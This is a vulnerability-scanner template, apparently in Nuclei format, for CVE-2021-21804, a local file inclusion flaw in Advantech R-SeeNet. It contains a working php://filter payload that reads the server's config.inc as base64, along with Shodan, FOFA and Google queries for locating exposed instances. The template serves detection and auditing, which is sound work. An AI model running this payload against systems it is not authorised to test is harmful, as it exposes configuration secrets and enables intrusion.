id: CVE-2021-21804

info:
  name: Advantech R-SeeNet options.php Local File Inclusion Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  description: A local file inclusion (LFI) vulnerability exists in the options.php script functionality of Advantech R-SeeNet v 2.4.12 (20.10.2020). A specially crafted HTTP request can lead to arbitrary PHP code execution.
  impact: |
    An attacker could exploit this vulnerability to read sensitive files on the server.
  remediation: |
    Update to the latest version of Advantech R-SeeNet to mitigate CVE-2021-21804.
  reference:
    - https://github.com/Live-Hack-CVE/CVE-2021-21804
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-21804
    cwe-id: CWE-98,CWE-829
    epss-score: 0.01564
    epss-percentile: 0.8775
    cpe: cpe:2.3:a:advantech:r-seenet:2.4.12:*:*:*:*:*:*:*
  metadata:
    vendor: advantech
    product: r-seenet
    shodan-query: http.html:"R-SeeNet"
    fofa-query:
      - body="r-seenet"
      - title="r-seenet"
    google-query: intitle:"r-seenet"

http:
  - method: GET
    path:
      - "{{BaseURL}}/index.php?page=options&sub_opt=php://filter/convert.base64-encode/resource=/config.inc"

    headers:
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
      Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
      Accept-Encoding: "gzip, deflate"
      Accept-Language: "pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7"
      Connection: "keep-alive"
      Cache-Control: "max-age=0"
      Upgrade-Insecure-Requests: "1"
      Cookie: "PHPSESSID=ppe11sb53oqa82d3o0trtkllr0"
    matchers:
      - type: word
        words:
          - "PD9waHANCg0KLyoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKi8NCi8qICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICovDQovKi"
        part: body
        condition: and
